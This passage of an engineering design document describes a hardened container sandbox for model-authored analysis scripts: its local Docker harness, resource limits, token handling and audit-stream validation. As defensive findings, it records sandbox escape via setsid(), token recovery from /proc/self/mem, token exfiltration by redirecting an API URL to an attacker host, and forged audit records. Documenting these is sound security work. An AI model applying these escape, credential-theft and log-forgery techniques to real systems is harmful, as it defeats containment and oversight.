`scripts/run-sandbox-local.sh` builds `sandbox/` and runs **the same image, the same
entrypoint and the same supervisor** in a plain container:

```
./scripts/run-sandbox-local.sh                 # build, (re)start, wait for /health
./scripts/run-sandbox-local.sh --test          # ... and drive the contract against it
./scripts/run-sandbox-local.sh --no-build      # restart in seconds
./scripts/run-sandbox-local.sh --logs          # container stdout = the audit sink
./scripts/run-sandbox-local.sh --stop
```

**There is no local code path.** The supervisor is passed as the container's command at
`docker run` time, exactly as `4h6.50` will pass it as `args:`; the image still ships no
`CMD` and the manifest still declares neither `command` nor `args`, so `scripts/deploy.sh`'s
refusal is untouched and nothing here can reach a cluster. chat-backend's client holds one
base URL and does the same thing against both.

| local flag | the manifest line it stands in for |
|---|---|
| `--user 65532:65532`, `--cap-drop ALL`, `--security-opt no-new-privileges` | `runAsUser`/`runAsGroup` 65532, `capabilities.drop: [ALL]`, `allowPrivilegeEscalation: false` |
| `--read-only` | `readOnlyRootFilesystem: true` |
| `--tmpfs /scratch:…,mode=0700,uid=65532,gid=65532` | the one `emptyDir` at `/scratch`, `fsGroup: 65532` |
| `--memory 3g --cpus 1.5` | `limits.memory` / `limits.cpu` |
| `--pids-limit 1024` | the kubelet's `pod_pids_limit` |
| `--stop-timeout 130` | `terminationGracePeriodSeconds: 130`. `--stop` uses `docker stop`, so the drain-reap-answer-wipe sequence the 130s buys actually runs locally; `docker rm -f`/`docker kill` bypasses it |
| `--publish 127.0.0.1:8081:8080` | container port 8080 and the Service; the host port differs **only** because the local db-api already holds 8080 |
| `GENETICS_API_URL` / `BIGQUERY_API_URL` at `host.docker.internal`, on the **dev-stack's** ports (results-api `:2000`, db-api `:8080`) and not the manifest's — locally `:4000` is chat-api (`4h6.49`) | the same two variables at cluster FQDNs pinned by `hostAliases` |
| `SANDBOX_RETENTION_S` passed through when set, so the retention deadline is observable in a test run (`4h6.49`) | unset; the supervisor's 900s |
| the supervisor as the `docker run` command | `args:` (`4h6.50`) |

**What is not reproduced.** The script prints this list every time it brings the container
up, because a fidelity gap nobody reads is the same as no fidelity gap at all:

1. **gVisor.** `runc`, not `runsc`, unless the daemon has the runtime registered — the script
   auto-detects it and says which one it used. Without it the host kernel is directly
   reachable from model-authored code, so section 2's "userspace syscall boundary" is the one
   control whose absence changes the threat model rather than the test coverage.
2. **The NetworkPolicy.** There is none. Egress is **unrestricted** — the whole host network,
   the internet, and `169.254.169.254`. Every claim in section 3 is untested locally; a
   script that exfiltrates in this container proves nothing about the pod, in either
   direction.
3. **`pod_pids_limit`.** `--pids-limit 1024` is a per-**container** cgroup where the kubelet's
   is per-**pod**. Close enough to exercise `4h6.41`'s budget, not the same backstop.
4. **The seccomp profile.** Docker's default, not `RuntimeDefault` via containerd. They are
   near-identical in origin and this is the one difference that turned out to be
   load-bearing — see the measurement below.
5. **`sizeLimit` enforcement — and, more consequentially, which budget `/scratch` is charged
   to.** The local `/scratch` is a 512 MiB tmpfs, so over-budget writes get `ENOSPC`. Under an
   `emptyDir` `sizeLimit` the **kubelet evicts the pod** instead — which is precisely the
   failure `4h6.46`'s sub-quotas exist to prevent, and it **cannot happen locally**. A quota
   implementation that only ever sees `ENOSPC` is untested against the thing it was written
   for.

   The second half of this gap is easier to miss and it changes how `4h6.41` must size its
   limits. **A tmpfs is page cache in the container's own memory cgroup**: locally, every byte
   under `/scratch` is charged against the *same* `--memory 3g` as the child's RSS. Measured
   inside the running container: `memory.current` **113 MiB → 414 MiB** after writing 300 MiB
   to `/scratch`. In the pod, `volumes.scratch.emptyDir` carries **no `medium: Memory`**, so it
   is node-disk-backed and charged to a **different, separately limited budget** —
   `ephemeral-storage` (requests `1Gi` / limits `2Gi`) — and **never** to `limits.memory: 3Gi`.
   So a script holding 2.6 GiB RSS beside a 400 MiB `/scratch` is cgroup-OOM-killed locally and
   runs fine in the pod, and an `RLIMIT_AS` or supervisor headroom tuned against this container
   is up to 512 MiB more conservative than the pod needs. `4h6.46`'s `/scratch` polling never
   sees the memory interaction locally at all, because in the pod there isn't one.
6. **`ephemeral-storage` requests/limits (`1Gi`/`2Gi`).** **No local form exists at all.**
   Docker has no equivalent knob, so the budget that actually bounds `/scratch` in the pod is
   not merely approximated here — it is absent, and exceeding it (kubelet eviction) is
   unobservable locally in either direction.
7. **`restartPolicy`.** `--restart no` against a Deployment that restarts: a crash-loop bug
   presents locally as a dead container with its logs intact and in the cluster as
   `CrashLoopBackOff`. Deliberate, and better for development, but it is a behavioural
   difference and belongs on this list.
8. **DNS and `hostAliases`.** The container uses ordinary Docker DNS; the pod has
   `dnsPolicy: None` and resolves the two service names out of `/etc/hosts`. The startup
   `/etc/nsswitch.conf` assertion still runs and still passes, so the `files`-before-`dns`
   requirement is exercised; the *absence* of a resolver is not.

`terminationGracePeriodSeconds: 130` **is** reproduced, via `--stop-timeout 130` plus a `--stop`
that calls `docker stop` rather than `docker rm -f` — see the table above. It is named here only
because getting it wrong is silent: `docker kill`, `docker rm -f` or Ctrl-C on the daemon all
SIGKILL immediately and skip the drain-reap-answer-wipe the 130s exists for.

Also not reproduced, and worth naming because it is a difference in **behaviour** rather than
configuration: the audit stream goes to the container's stdout, collected by `docker logs`
rather than by the cluster's logging agent. That is the single place the deployment
difference shows in what the supervisor does, and it was already anticipated above.

**`scripts/test-supervisor.py --container URL [--container-name NAME]`** drives the contract
against the running container over HTTP and adds a group of checks that only exist there,
because they are
properties of the **image**: the read-only root filesystem, the absence of a writable `/tmp`,
the pruned venv (no `pip`, no `setuptools`, no `google-auth`), the genetics SDK importing,
matplotlib producing a PNG from the baked font cache under a read-only rootfs, no credential
anywhere in the child's environment, and the child running as 65532 rather than the
advertised-and-unreachable 65533. `--container-name NAME` additionally lets the audit-stream
group read the container's own stdout via `docker logs`, which is the only place those records
appear; without it that group skips by name. In-process mode is unchanged and remains the fast
path. Both modes also compare the harness's **copy** of `analyze_conversations.py`'s
`SDK_CALL_RE` against the literal in a `genetics-mcp-server` checkout beside this one, read off
disk with `ast` rather than imported (the sandbox image installs only the SDK's import closure,
so the two repos cannot share a module). Watching only the supervisor side would let the
*analyzer* move while every assertion built on the stale copy kept passing; with no sibling
checkout the comparison skips by name rather than passing quietly.

**The two counts are not comparable, and the summary line says so.** Container mode runs the
two wire groups plus the image group — nothing else. The groups that reach into the
supervisor's own objects (the startup assertions, request parsing, the queue, the artifact
manifest, the startup wipe) are **not run at all** over HTTP, because no route reaches them;
that is most of the in-process checks. They are printed by name under "check groups NOT RUN in
this mode" at the end of every container run, so a container total cannot be read as a
near-complete fraction of the in-process total. `skip()` is the narrower mechanism and its
claim is unchanged: it covers a check *inside a group that ran* — one needing the harness's
own view of `/scratch`, which a container does not give it — and those are counted and listed
individually. One such skip has since become a real check in both modes: the retained
artifacts of a refused-duplicate execution are now read back over `GET /artifact`
(`genetics-results-suite-8z1`) instead of by looking at the host filesystem, so container mode
verifies it too. Implementing the missing groups over the wire is
not this bead's scope; being honest about their absence is.

**One thing only became visible in a container.** In-process, the harness and the supervisor
share an interpreter, a uid and a filesystem, so `SANDBOX_SCRATCH_ROOT` is set and `/scratch`
is a temporary directory — the exact configuration `_scratch_root()` warns is test-only.
Container mode is the first run in which `/scratch` is `/scratch`, the rootfs is read-only
and `prewarm()` actually executes, and it confirmed the ordering `prewarm.py`'s docstring
demands: a plot is produced with no writable path outside `/scratch` and no font-cache
rebuild. Nothing in the wire contract needed changing — the supervisor answered identically
in both modes on every shared check.

#### Measurement for `4h6.55`: the namespace blocker is the seccomp profile, not the capabilities

`4h6.55` (fork-without-exec plus one shared uid leaves no isolation between executions) has a
leading candidate fix that needs a PID namespace and a mount namespace under `drop: [ALL]`,
`allowPrivilegeEscalation: false`, uid 65532. Measured from **inside a real execution** in
this container — i.e. from the position an attacker occupies — with the image, the shared
uid and `CapEff: 0000000000000000`, `NoNewPrivs: 1`, `Seccomp: 2`:

| call | result |
|---|---|
| `unshare(CLONE_NEWNS)` | `EPERM` |
| `unshare(CLONE_NEWPID)` | `EPERM` |
| `unshare(CLONE_NEWUSER)` | `EPERM` |
| `unshare(CLONE_NEWUSER\|CLONE_NEWNS\|CLONE_NEWPID)` | `EPERM` |

The control experiment is what makes this useful. With **the same** uid, `--cap-drop ALL` and
`no-new-privileges`, and **only** `seccomp=unconfined` changed: `unshare(CLONE_NEWUSER)`
**succeeds**, and inside that user namespace `unshare(CLONE_NEWNS|CLONE_NEWPID)` **also
succeeds**. So the blocker on the namespace calls is the **seccomp profile**, not the
capability set and not `no_new_privs` — the profile returns `EPERM`, which is
indistinguishable from the capability check unless you vary it.

**But only the `CLONE_NEWUSER`-first route works, even unconfined.** With the profile relaxed,
`unshare(CLONE_NEWNS)` and `unshare(CLONE_NEWPID)` *alone* still return `EPERM`: they need
`CAP_SYS_ADMIN` in the current user namespace, which this uid does not have and the relaxed
profile does not confer. Only entering a new **user** namespace first — where the process is
root and therefore holds `CAP_SYS_ADMIN` in it — makes the mount and pid namespaces reachable.
This constrains how `4h6.55`'s fix must be *written*, not just what it must be granted: a fix
that calls `unshare(CLONE_NEWPID)` directly fails even with the profile relaxed, so the call
has to be `CLONE_NEWUSER` first (or `CLONE_NEWUSER|…` in one call) and the uid/gid maps
written before anything else is attempted.

**`setuid(65533)` is a separate result and does not belong to the finding above.** It returns
`EPERM` under the default profile *and* under `seccomp=unconfined` — the control leaves it
unchanged. Its blocker is the **capability set** (no `CAP_SETUID` under `drop: [ALL]`), which
is why option (a) is unreachable exactly as recorded, and relaxing seccomp would not recover
it. The same holds for `chown(65533)` and `CAP_CHOWN`.

Consequences for `4h6.55`, none of them acted on here:

- A namespace-based fix under `RuntimeDefault` needs the profile relaxed, and "custom seccomp
  profile" is already in **Rejected controls** above (it needs a node-local file distributed
  by DaemonSet and referenced via `localhostProfile`). That rejection now costs something
  concrete, so it is owed a re-examination rather than a re-citation.
- **This says nothing about gVisor**, and gVisor is what will actually run. `runsc` implements
  `unshare` in the sentry with its own support matrix, and the profile enforced at the host
  applies to the sentry's syscalls, not the application's. Unmeasured, and not measurable on
  this machine, which has no `runsc`.
- Docker's default profile is the closest local analogue of `RuntimeDefault`, not the same
  file. The measurement is a strong hint about the cluster, not a result from it.

### As built (`4h6.41`, `4h6.42`, `4h6.43`, `4h6.45`, `4h6.46`) — the per-execution limits, and what each one is worth

`4h6.39`'s five holes. Four of them landed together in `sandbox/supervisor.py` because they
share one poll loop and one kill path; `4h6.45` (the audit stream) followed. **Every limit
below was watched firing in the real image** via `scripts/run-sandbox-local.sh --test`, not
reasoned about; the checks live in `scripts/test-supervisor.py`'s `limits`, `tokens`,
`retention`, `retained ceiling` and `audit stream` groups. The first four run in **both** modes.
The `audit stream` group runs in container mode **only when `--container-name NAME` is given** —
its output leaves by the container's stdout rather than over the wire — and skips by name
otherwise; `run-sandbox-local.sh --test` supplies it. The `audit stream units` group, which
calls `_AuditForwarder` and `_drain` directly, is in-process only and is listed among the groups
container mode never invokes.

#### One watchdog, one kill path, and the two reap hazards it had to be written around

A single daemon thread per execution polls the wall clock, the process-group size and both
`/scratch` quotas every 200 ms. Four timers would have given four chances to get the reap
race wrong; the drain thread's 8 MiB cap enters the same path through a callback.

**Hazard 1 — a `pgid` cached at fork time is a stale pointer at a recycled pid.** Once
`waitpid` reaps the child its pid is free for reuse, so a watchdog that decided to kill a
moment earlier can `killpg` a group that is plausibly *the next execution's child*. The fix
is structural rather than a narrowed window: `waitid(P_PID, …, WEXITED | WNOWAIT)` blocks
until the child exits **without** consuming the zombie — so the pid stays un-recyclable — and
the actual `waitpid` and the `reaped` flag are then set together under a lock every signal
path also takes. A plain blocking `waitpid` cannot do this; it reaps before any lock can be
taken.

**Hazard 2, and it was found by running the code, not by reading it — reading the pgid back
right after the fork returns the SUPERVISOR'S OWN process group.** The child's `setsid()` is
the first statement of `_child_main`, but the parent wins that race routinely: the harness
logged `child pgid is 651696, not the 651474 recorded at fork`, and 651474 was the
supervisor's group. Had that value been trusted, the first wall-clock timeout would have
`SIGTERM`ed the supervisor and everything in its group. The parent cannot fix it by calling
`setpgid(pid, pid)` itself either — that makes the child a group leader and `setsid()` then
fails with `EPERM` for a group leader. So **no pgid is cached at all**: it is resolved live at
every use by a helper that refuses to return the supervisor's own group, and a child that has
no group of its own yet is signalled by pid alone. Two consequences worth stating: the pid
budget **skips** a poll rather than counting the supervisor's group against the child's
budget, and `None` from the group scan means "unenforceable", never "empty".

**What the group kill reaches, and what it does not.** It reaches the child and every
descendant that stayed in its process group — an ordinary script's `subprocess` children. A
descendant that calls `setsid()` **leaves the group and is not signalled**; that was measured
with `killpg` returning `ESRCH` while the escapee kept running, and it also defeats the token
file (below). This is the best mechanism available under the pod's constraints and it is
**not a containment boundary**. `4h6.55` owns the one that would be, and until it lands an
escaped process shares the pod with the next user. Nothing in the code or in this document
should be read as claiming otherwise.

#### `4h6.41` — wall clock, memory, oom_score_adj, pid budget

| control | value | what fires, and what it is worth |
|---|---|---|
| wall clock | request `timeout_s`, default 60 s, hard ceiling 120 s (rejected, never clamped) | `SIGTERM` the group at the deadline, `SIGKILL` after `KILL_GRACE_S` (2 s), answer `200` with `status: "timeout"`, `error.type: "Timeout"`, `error.limit: null` |
| `RLIMIT_AS` | 2560 MiB = `limits.memory` 3Gi − 512 MiB supervisor headroom, **soft and hard** | set in the **child**, because `setrlimit` on another process needs `CAP_SYS_RESOURCE`, which the pod drops. An over-large allocation is a clean `MemoryError` inside the child rather than a cgroup OOM kill whose victim the kernel picks by RSS heuristic — and which gVisor's accounting changes again, since the sentry holds memory on the application's behalf |

**The hard limit is lowered too, and that is the whole control.** Setting only the soft limit
made this **opt-out**: raising a soft limit back up to the hard limit is unprivileged, so
`setrlimit(RLIMIT_AS, (RLIM_INFINITY, RLIM_INFINITY))` from the script succeeded — **measured
in the real image**, after which allocating 2900 MiB produced exactly the cgroup OOM kill
(`sig=9`) the limit exists to prevent. Lowering a hard limit *is* unprivileged and is
irreversible without `CAP_SYS_RESOURCE`, which the pod drops, so the child cannot undo it. The
harness asserts the undo is **refused**, in both modes, rather than asserting the soft value.
| child `oom_score_adj` | raised to `+500` from the parent | see below; weaker than section 2 implies |
| supervisor `oom_score_adj` | **not set, and nothing pretends to** | `-500` returned `EPERM` for the supervisor's own file *and* for the child's, measured. Lowering below the inherited floor needs `CAP_SYS_RESOURCE`. Section 2's `-500` is a **pod-spec change** (`4h6.50`), not a runtime one |
| pid budget | 32 processes in the child's group | supervisor-side watch via `/proc/<pid>/stat`'s `pgrp` field. `RLIMIT_NPROC` is **advisory only** here: it is per real uid across the pid namespace and the two processes share uid 65532, so a child forking to its limit also stops the *supervisor* forking. Over budget kills the whole group: `status: "limit"`, `error.type: "PidLimit"` |

**`RLIMIT_AS` is sized against the POD's budget, and the local container's behaviour is
deliberately ignored.** `4h6.40` measured that the local `/scratch` is a tmpfs whose page
cache is charged to the container's *own* 3 GiB memory cgroup (113 MiB → 414 MiB after a
300 MiB write), while the pod's `emptyDir` is node-disk-backed and charged to
`ephemeral-storage` (1Gi/2Gi), **never** to `limits.memory`. Tuning to the local behaviour
would be up to 512 MiB more conservative than the pod needs. **The divergence a reader will
hit:** a script holding ~2.4 GiB while `/scratch` holds 400 MiB can be cgroup-OOM-killed
*locally* and run fine in the pod. The number is therefore hard-coded from
`k8s/deployments/sandbox.yaml` rather than read from `/sys/fs/cgroup`.

**`RLIMIT_AS` bounds virtual address space, not RSS, and the prewarmed child does not start
from zero.** Measured inside the image: a child that has inherited `prewarm()`'s
numpy/scipy/polars/matplotlib mappings already has `VmSize` ~1358 MiB against `VmRSS`
~113 MiB, because BLAS reserves far more than it touches. So the script's own allocation
headroom under the 2560 MiB limit is **~1.2 GiB, not ~2.5 GiB**. Raising the limit to
"fix" that would spend the supervisor's headroom, which is the one thing keeping the cgroup
OOM killer from having to choose between the two processes.

**What the `oom_score_adj` raise is actually worth, measured rather than assumed.** The child
starts at `0` (inherited). Writing `500` succeeds. Writing `0` again **also succeeds, from
inside the child, at any time** — only going *below* the inherited floor is refused (`-500` →
`EPERM`). So a script can undo it, and the honest guarantee is not "+500 holds" but "the
child can never make itself a *better* OOM candidate than the supervisor": its adjustment
stays in `[0, 1000]` against the supervisor's `0`. Section 2's Memory row reads as though the
`+500`/`-500` pair is durable in both directions; neither half is, and this row is the
authoritative one.

#### `4h6.42` — the two output bounds, which are different limits

- **Pipe cap, 8 MiB.** The reader **stops** at the cap and kills the group; it does not drain
  and discard, because the cap exists so the supervisor's memory and the pod's CPU stop being
  consumed and draining achieves neither. `output_bytes` therefore stops at the cap too,
  which is what that field means on the wire. Answer: `status: "limit"`,
  `error.type`/`error.limit` `"OutputLimit"`, `output_truncated: true`. A child blocked
  writing to the now-unread pipe still dies — a pipe write is an interruptible sleep, so
  `SIGTERM`'s default disposition ends it, and `SIGKILL` follows 2 s later regardless.
- **Return window, 64 KiB.** First 32 KiB + `\n...[<N> bytes elided]...\n` + last 32 KiB, the
  marker additional to the budget. Head **and** tail because the traceback is at the tail;
  head-only truncation is the expensive failure shape, since the model then debugs against
  output it cannot see.
- **The cut is on bytes and never through a character.** Up to 3 bytes are trimmed from each
  side onto a UTF-8 boundary and **counted into `<N>`**, so head + tail + elided accounts for
  every byte. Without this the split introduces U+FFFD at both seams; the harness prints
  `'x' + 'é' * 200000` specifically so the boundary lands mid-sequence rather than neatly
  between two characters.
- **`output_truncated` is true for either cause** — the pipe cap fired, or the window elided a
  middle.
- **stderr is interleaved into the same pipe as stdout** (settled by `4h6.39`, restated
  because `4h6.42` was asked to record the decision): section 2 budgets **one** 64 KiB window,
  and splitting it across two streams either halves the window or doubles the budget. The
  SDK's audit records **are** separated out, onto their own fd (`4h6.45`), so they are not
  charged against this window and are not indistinguishable from script output.

#### `4h6.43`/`4h6.44` — the read-once token file, which is NOT an exposure bound

The two tokens arrive in the POST body, are checked for consistency at parse time, and are
written before the fork to `/scratch/<execution_id>/tokens.json`, mode `0600`, `O_EXCL`. The
child is given the **path** in `SANDBOX_TOKEN_FILE`, never the tokens themselves — a token in
the environment is readable through `/proc/<pid>/environ` by any process with the same uid,
and supervisor and child share uid 65532. The supervisor never puts them in its own
environment, never writes them to the pod spec, a ConfigMap or a Secret, and never reads the
file back. `4h6.44` owns the other half in the SDK, and **it has landed** — see "The SDK half
(`4h6.44`)" below for what it does and what it does not buy.

**No `chown` and not mode `0400`.** That is section 2's "Permission contract" for option (a),
which is **NOT IN EFFECT**: the pod holds no `CAP_CHOWN` or `CAP_SETUID` and both were
measured to return `EPERM`. `0400` without the `chown` would exclude the child, which is the
process that has to read it.

**This file bounds nothing, and every earlier phrasing in this document read as though it
did.** `4h6.55` measured, against this exact shape:

- the child is forked **without exec** from a supervisor holding tokens in its address space,
  and a raw `/proc/self/mem` scan in the child recovered them — **including from an execution
  that had already completed and been released**. Clearing references cannot help: freed
  Python strings stay in arenas that copy-on-write hands to the child;
- a detached `setsid()` grandchild of an **earlier** execution read **this** execution's
  mode-0600 file from inside the read-once window;
- the same tokens are reachable by module global, frame walk and `gc.get_objects()`.

So the file is still the right thing to build — the child needs *some* route to the
credential, it keeps the token out of `/proc/<pid>/environ`, and it gives the SDK something to
unlink — but **the exposure is bounded by `4h6.55`'s resolution and by nothing here.** The
supervisor also unlinks the file itself the moment the child is reaped, whether or not the
SDK ever read it, and `_retain` deletes it again with the rest of the directory; that is
hygiene, not a bound.

**Refusing to run uncredentialed** is enforced in `parse_execute_request`, before any
directory exists: a token set that is incomplete, carries the wrong audience, or disagrees
with the body's `user`/`session_id`/`execution_id` is a `400`. This matters because db-api's
pre-existing fail-open branch (unset `INTERNAL_API_SECRET` disables auth with a startup
warning) is exactly what an uncredentialed run would reach.

The `sub`/`sid`/`jti` claims stay on the request object and `4h6.45` stamps audit records from
them. The supervisor is the only component that both holds the token and sits outside the
child's address space, which is why `4h6.12` put the stamping here.

**The SDK half (`4h6.44`), as built.** It lives in genetics-mcp-server's
`tools/executor.py` — `_read_and_unlink`, `_load_sandbox_tokens`, `_parse_sandbox_tokens`,
`_SandboxTokenAuth` and `_build_client` — not in `sdk/client.py`, because the client the SDK
delegates to is the executor's. Five properties, each with a reason:

- **Read once, and unlink whether or not the read succeeded.** The unlink is in a `finally`
  around the read, so a file the SDK failed to parse is still removed rather than left for
  the next process with this uid. The read is capped at 64 KiB.
- **`O_NOFOLLOW`**, for the same reason the supervisor writes with it: `/scratch` is writable
  by the child's uid, so a symlink planted at the path would otherwise redirect the read.
- **Per-destination audience binding.** One httpx client serves both upstreams and the two
  tokens are not interchangeable, so the audience is chosen per request from the destination
  (`aud: db-api` for `BIGQUERY_API_URL`, `aud: results-api` for `GENETICS_API_URL`) rather
  than by a default header on the client. Both validators pin `aud` as a **string** and
  refuse a list, so a token sent to the wrong service is a hard `401`, not a degraded success.
- **Hard failure rather than an uncredentialed run.** `SANDBOX_TOKEN_FILE` being set is the
  statement that this process is a sandbox execution; a file that is missing, unreadable,
  not JSON, or short of either audience raises rather than falling back to
  `INTERNAL_API_SECRET` or to no header. The sandbox path and the service path are mutually
  exclusive by construction — the secret is never attached alongside the token, because a
  request carrying it resolves no sandbox principal and is served with no accounting
  (`genetics-results-suite-0lf`).
- **A request to any other destination gets no credential.**

**What the binding is worth, stated exactly.** It is hygiene against a misconfigured or
accidentally-redirected base URL, plus the correctness property that neither upstream can be
handed the other's token. **It is not a control over the script.** The child is forked
without exec and therefore owns `os.environ`; `base_url` and `bigquery_url` are resolved from
`GENETICS_API_URL`/`BIGQUERY_API_URL` on **first use**, and `sdk/__init__.py` holds
`_client = None` until the first call. Reproduced: with a valid token file present and
`GENETICS_API_URL` pointed at an attacker-controlled host **before** the first SDK call, the
request went out carrying the results-api token. What stops that in the pod is the egress
allow-list in `k8s/network-policies/sandbox-policy.yaml` and nothing in the SDK — and there is
no NetworkPolicy in the local Docker path, so the local sandbox does not have that stop.

**And it is not an exposure bound either**, for exactly the reasons the file is not: the
token is in the child's own address space the moment the SDK reads it, `4h6.55`'s
`/proc/self/mem` scan recovered tokens from an execution that had already completed, and a
detached `setsid()` grandchild of an earlier execution read a live token file from inside the
read-once window. Read-once-and-unlink is worth building and is worth nothing as a bound. The
exposure is bounded by `4h6.55`'s resolution and by nothing here.

**What the token does buy** is that the credential on the wire is 5 minutes long, scoped to
one audience, and carries `sub`/`sid`/`jti` — so the upstream controls keyed on `jti` are no
longer inert and every `endpoint_access` line is attributable to a user, a conversation and an
execution. That is a real change from `INTERNAL_API_SECRET`, which never expires, is accepted
at both services, and resolves no principal at all.

**The two upstreams do not meter the same way, and the asymmetry is not "one meters and one
does not".** Re-derive rather than trusting this:

| | results-api (`app/core/sandbox_budget.py`) | db-api (`api/main.py`) |
|---|---|---|
| per-`jti` request count | **1000** (`SANDBOX_MAX_REQUESTS_PER_EXECUTION`) | **none** |
| per-`jti` concurrency | **4**, and **8** pod-wide | **none** |
| per-`jti` aggregate bytes | **1 GiB** response bytes | **200 GB** BigQuery bytes processed |
| where it is enforced | `SandboxResponseCapMiddleware`, **before routing** — an unmatched path is admitted and counted like any other | in the handlers, on the four BigQuery paths only |

So `genetics.sql()` — the most expensive surface the sandbox reaches — is **bounded by spend
and attributable per execution, but not bounded by request count or by concurrency**: a script
can issue unlimited db-api requests at unlimited concurrency as long as each stays inside the
200 GB aggregate, and db-api's cheap paths (`/health`, the cached `/schema` hits) are not
counted at all. That is a deliberate difference in kind — db-api's cost is BigQuery bytes and
results-api's is egress and pod memory — not an oversight, but it does mean "the per-execution
counters now apply" is true of results-api's four counters and of db-api's byte budget, and is
**not** a statement that db-api counts requests. It does not.

#### `4h6.45` — the audit stream: read, capped, re-framed, stamped, forwarded

A second pipe, created before the fork, dup'd onto `CHILD_AUDIT_FD` (4) in the child and named
to the SDK as `GENETICS_SDK_AUDIT_FD`. The supervisor holds the read end and drains it on a
third thread that shares the `reaped` event and `DRAIN_GRACE_S` deadline the output and status
pipes use — the audit write end is inherited by an escaped descendant exactly as the output
pipe's is, so EOF is not something waiting longer can produce.

`_AuditForwarder`, one instance per execution, does four things and each was demonstrated:

- **Caps, on the read end.** `AUDIT_LINE_MAX_BYTES` (4 KiB, per record), `AUDIT_STREAM_MAX_BYTES`
  (1 MiB, per execution, counted over everything read including what is then dropped) and a
  token bucket (`AUDIT_RATE_PER_S` 100, `AUDIT_RATE_BURST` 200). An over-long record is
  **dropped, never truncated**: a truncation removes the tail where `rows:` lives, so it either
  produces something that no longer parses or a prefix that parses as a *different* record —
  the same replace-don't-truncate rule `_sanitise_error_type` applies to a child-supplied
  `error.type`. **The same rule holds at the byte budget**, which is the one place a cut is not
  the reader's choice: the child picks where the boundary falls by padding, so the partial
  record left in the buffer when the budget bites is **discarded, never flushed at close** — a
  validator padded to the budget with oversize lines (which spend no rate token) and turned
  `rows: 999999999` into a forwarded `rows: 9` under the real user's stamp, counted as
  `records=1`. Past the byte budget the reader **keeps reading and discards**, the status
  pipe's behaviour and deliberately not the output pipe's: stopping would block the child's
  next audit write, and a child blocked inside a successful data call turns an observability
  bound into an execution failure. What is discarded is counted by its newlines **plus the
  unterminated record at the end**, so a flood carrying no newline at all still reports a
  `dropped_over_budget` rather than only a larger `bytes=`.
- **Re-parses and re-frames.** Every line is matched **whole** against three shapes — the SDK's
  `Executing SDK function:` record, its `Rejected SDK function:` record, and its refusal-budget
  notice as a fixed literal — and anything that does not match is dropped and counted. Laxity
  here is the forgery: `search()`-based parsers, including this repo's own
  `scripts/analyze_conversations.py`, match a record *anywhere* in a line, so a child appending
  `[user=admin@finngen.fi] … Executing SDK function: sql … rows: 1` to an otherwise ordinary
  record would otherwise have written a genuine-looking access under someone else's name. The
  argument summary is admitted as **printable ASCII minus `[`, `]`, `{`, `}` and backslash**, or
  as the bare literal `<unavailable>` — the two things `_summarize_arguments` can return, the
  second being what it returns when `signature.bind_partial` raises `TypeError`, i.e. whenever an
  ordinary script passes one extra positional or one unknown keyword. That charset is **tighter
  than the SDK's own**, deliberately: `_summarize_value` falls through to
  `f"<{type(value).__name__}>"` and a script owns `__name__`, so the emitting side is not where
  this can be held. Non-ASCII was measured reaching the container's stdout inside an otherwise
  genuine record — U+2028, U+2029 and U+0085 each split the record into **two** lines under
  `str.splitlines()`, and U+202E reverses how the rest of it reads. Row counts are matched with
  `[0-9]`, never `\d`, which in Python is every Unicode decimal digit: `rows: ١٢٣` was forwarded
  and the analyzer's `int()` read back 123. The SDK's shared-stream warning is deliberately
  **not** admitted: on this path it is false, and forwarding it would make the analyzer distrust
  a stream the supervisor stamped. Its refusal-budget notice **is** admitted, and the number in
  it is **child-supplied** — nothing on the read end counts the SDK's refusals, so a child can
  write the notice itself with a figure of its choosing (`999999999` was measured); the literal
  text around it is what is bounded, and the supervisor's own summary is the cross-check.
- **Keeps reading even when forwarding fails.** If the sink raises, the drain thread discards
  the rest of that stream and keeps reading the fd. It may not stop: nothing else reads it, the
  64 KiB pipe fills, and a still-running child blocks in `os.write` inside a call that was
  succeeding — the same reason the byte budget discards rather than stops.
- **Stamps identity from the tokens.** `[user=…] [session=…] [execution=…]` come from the
  claims' `sub`/`sid`/`jti`, sanitised on the same charset-and-replace rule (a value that would
  break the framing renders `<invalid>`). Everything before the record marker — the SDK's
  asctime, logger name, level and its own prefix — is discarded rather than parsed.
- **Forwards to the pod's own stdout**, written to the stream directly rather than through
  `LOG`: the logging configuration belongs to `main()`, and stdout is block-buffered when it is
  a pipe (which is what it is under both `docker logs` and the kubelet), so each record is
  flushed. In the local Docker backend this is the container's stdout — the same code, a
  different collector.

MEASURED IN THE IMAGE, from a child writing directly on fd 4: a forged
`[user=admin@finngen.fi]` prefix and a rewritten `SANDBOX_USER` produced a record stamped
`[user=dave@finngen.fi]`, and the string `admin@finngen.fi` appeared nowhere in the container's
stdout; a record with a second record appended was dropped whole (`dropped_unparseable=1`, and
`rows: 99` never appeared); a 1 MiB line produced `dropped_oversize=1` with none of its bytes
on the stream; 2,000 records in one `write()` produced `records=202 dropped_rate=1798`; and
1.3 MB produced `dropped_over_budget=3869` with the execution still returning `status: "ok"`.

**What this does not make true.** The records still do not bound what a hostile script *did*:
it can emit well-formed records for calls it never made, `client._executor.<method>()` reads
data with no record at all (`4h6.33`), and a child can still lose its own records by flooding
its own pipe. What is bounded is **who a record is attributed to** and **what shape it may
take**, and that the loss is counted rather than silent.

#### `4h6.46` — `/scratch` sub-quotas, retention and the reaper

| budget | value | enforcement |
|---|---|---|
| per-execution artifacts | 64 MiB **and** 1024 entries | polled; over → `status: "limit"`, `error.type: "ArtifactQuota"` |
| per-execution total (`/scratch/<id>`, artifacts + tmp + caches) | 192 MiB **and** 20 000 entries | polled; over → `status: "limit"`, `error.type: "ScratchQuota"` |
| aggregate `/scratch` during a run (retained + live) | 480 MiB | polled; over → `status: "limit"`, `error.type: "ScratchQuota"` |
| aggregate retained artifacts | 256 MiB | oldest-first eviction when a completion breaches it |
| retention | 15 min from completion, deleted on the next reaper tick — so the observable window is **[15 min, 15 min + 30 s]** | reaper thread, every 30 s (`REAPER_POLL_S`) |
| manifest entries in one response | 1024 | listed; the rest counted in `artifacts_omitted` |

**The budget, stated once.** `sandbox/supervisor.py` states the same arithmetic in one comment
block above the constants and nowhere else; an earlier version stated it in two places that
contradicted each other (`448 MiB < 512 MiB` in one, a `~200 MiB` poll overshoot in the
other — `256 + 192 + 200 = 648` against a 512 MiB volume).

```
  RETAINED_ARTIFACTS_CEILING   256 MiB   steady state, held by oldest-first eviction; each
                                         term is bounded — a COMPLETED retention is trimmed to
                                         the 64 MiB artifact quota before it is retained, a
                                         FAILURE-PATH one is neither cleaned nor trimmed and is
                                         bounded by the 192 MiB execution quota instead
+ EXECUTION_TOTAL_QUOTA        192 MiB   the one live execution
= 448 MiB
